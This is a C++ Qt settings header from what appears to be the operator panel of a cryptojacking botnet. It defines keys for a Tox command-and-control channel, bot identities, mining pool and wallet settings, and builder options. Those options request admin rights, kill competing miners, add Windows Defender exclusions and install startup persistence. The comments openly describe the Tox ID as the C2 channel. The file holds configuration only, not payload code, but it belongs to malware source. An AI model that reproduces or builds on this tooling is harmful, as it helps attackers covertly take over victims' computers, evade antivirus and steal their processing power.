#pragma once

#include <QHash>
#include <QObject>
#include <QVariant>

/* Every persisted key lives here with its default, so no page invents
 * settings behind another's back. Values land in the platform store
 * (registry on Windows, ini elsewhere) through QSettings. */
namespace Keys {
// --- operator-supplied addresses ----------------------------------------
inline const QString NetEndpoint = QStringLiteral("net/endpoint");
inline const QString IdTox       = QStringLiteral("id/tox");

// --- generated Tox C2 pair (operator + bot identities) --------------------
inline const QString ToxOperatorId       = QStringLiteral("tox/operatorId");
inline const QString ToxOperatorSavedata = QStringLiteral("tox/operatorSavedata");   // hex
inline const QString ToxBotId            = QStringLiteral("tox/botId");
inline const QString ToxBotSavedata      = QStringLiteral("tox/botSavedata");        // hex
inline const QString ToxBotName          = QStringLiteral("tox/botName");
inline const QString ToxBots             = QStringLiteral("tox/bots");               // JSON array [{id,name}] for dashboard list
inline const QString ToxBotsHeaderState  = QStringLiteral("tox/botsHeaderState"); // base64 header state

// --- mining --------------------------------------------------------------
inline const QString MinerPool      = QStringLiteral("miner/pool");
inline const QString MinerWallet    = QStringLiteral("miner/wallet");
inline const QString MinerPassword  = QStringLiteral("miner/password");
inline const QString MinerTls       = QStringLiteral("miner/tls");
inline const QString MinerOnIdle      = QStringLiteral("miner/mineWhenIdle");
inline const QString MinerOnActive    = QStringLiteral("miner/mineWhenActive");
inline const QString MinerIdleAfter   = QStringLiteral("miner/idleAfterMinutes");
inline const QString MinerIdleEffort  = QStringLiteral("miner/idleEffortPct");   // 1-100
inline const QString MinerActiveEffort= QStringLiteral("miner/activeEffortPct"); // 1-100

// --- appearance ----------------------------------------------------------
inline const QString UiAccent     = QStringLiteral("ui/accent");        // pink|purple|teal
inline const QString UiAnimations = QStringLiteral("ui/animations");
inline const QString UiTray       = QStringLiteral("ui/minimizeToTray");
inline const QString UiStartPage  = QStringLiteral("ui/startPage");

// --- build: miner client builder ------------------------------------------
inline const QString BuildConfigUrl    = QStringLiteral("build/configUrl");
inline const QString BuildWatchedProcesses = QStringLiteral("build/watchedProcesses");
inline const QString BuildCpuEnabled   = QStringLiteral("build/cpuEnabled");
inline const QString BuildGpuEnabled   = QStringLiteral("build/gpuEnabled");
// BuildRemoteMiners removed — the client no longer supports downloading
// miner PEs from the panel. Any legacy value in the registry is ignored.

// --- config update channel -------------------------------------------------
// "endpoint" | "tox" | "config_link" — which mechanism delivers updated
// mining config to the built client.
inline const QString ConfigUpdateMode = QStringLiteral("build/configUpdateMode");

// --- build features (priority order) --------------------------------------
// PRIORITY 1: Admin Manifest - Builds with manifest requesting admin rights
inline const QString BuildAdminManifest = QStringLiteral("build/adminManifest");
// PRIORITY 2: Foreign Miner Killer - Terminates non-Bminer miners
inline const QString BuildForeignMinerKiller = QStringLiteral("build/foreignMinerKiller");
// PRIORITY 3: Defender Exclusion - Adds folder to Windows Defender exclusions
inline const QString BuildDefenderExclusion = QStringLiteral("build/defenderExclusion");
// PRIORITY 4: Debug Console - Shows console window with debug output
inline const QString BuildDebugConsole = QStringLiteral("build/debugConsole");
// PRIORITY 5: Persistence - Adds startup entry for auto-launch
inline const QString BuildPersistence = QStringLiteral("build/persistence");

// --- pet (off by default; it is a bit of fun, not the point of the app) ---
inline const QString PetEnabled = QStringLiteral("pet/enabled");
inline const QString PetScale   = QStringLiteral("pet/scale");          // 60..200 (%)
inline const QString PetSpeed   = QStringLiteral("pet/speed");          // 0.2..3.0
inline const QString PetFollow  = QStringLiteral("pet/follow");
inline const QString PetChatter = QStringLiteral("pet/chatter");
inline const QString PetOnTop   = QStringLiteral("pet/onTop");
} // namespace Keys

class AppSettings : public QObject
{
    Q_OBJECT
public:
    static AppSettings *i();

    QVariant get(const QString &key) const;
    bool     getBool(const QString &key) const   { return get(key).toBool(); }
    int      getInt(const QString &key) const    { return get(key).toInt(); }
    double   getDouble(const QString &key) const { return get(key).toDouble(); }
    QString  getString(const QString &key) const { return get(key).toString(); }

    // The operator's Tox ID is the C2 channel. A manually pasted ID wins; when
    // it is empty, fall back to the generated pair's operator ID so every page
    // (Settings, Dashboard, Control, Build) agrees on the same identity.
    QString operatorToxId() const
    {
        const QString manual = getString(Keys::IdTox).trimmed();
        return manual.isEmpty() ? getString(Keys::ToxOperatorId).trimmed() : manual;
    }

    void set(const QString &key, const QVariant &value);
    void remove(const QString &key);
    void resetToDefaults();

    static const QHash<QString, QVariant> &defaults();
    QString storageLocation() const;

signals:
    void changed(const QString &key, const QVariant &value);

private:
    explicit AppSettings(QObject *parent = nullptr);
    QHash<QString, QVariant> m_cache;
};
